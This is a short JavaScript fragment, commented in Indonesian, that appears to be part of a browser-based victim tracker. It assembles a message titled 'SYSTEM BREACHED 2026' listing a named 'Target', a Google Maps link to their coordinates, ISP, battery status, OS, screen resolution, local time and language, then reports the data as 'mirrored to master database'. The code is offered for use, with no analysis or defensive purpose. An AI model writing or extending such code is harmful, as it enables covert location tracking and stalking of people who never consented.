// Tambahan data teknis baru
const screenRes = `${window.screen.width}x${window.screen.height}`;
const localTime = new Date().toLocaleTimeString();
const language = navigator.language;
const mapLink = `https://www.google.com/maps?q=${userData.coords}`;

const msg = `🚨 *SYSTEM BREACHED 2026* 🚨%0A%0A` +
            `👤 *Target:* ${name}%0A` +
            `📍 *Google Maps:* ${mapLink}%0A` +
            `📡 *ISP/Provider:* ${userData.isp}%0A` +
            `🔋 *Battery Status:* ${userData.battery}%0A` +
            `💻 *Platform/OS:* ${userData.os}%0A` +
            `🖥️ *Screen Res:* ${screenRes}%0A` +
            `⏰ *Local Time:* ${localTime}%0A` +
            `🌐 *System Lang:* ${language}%0A%0A` +
            `_Status: Data successfully mirrored to master database._`;
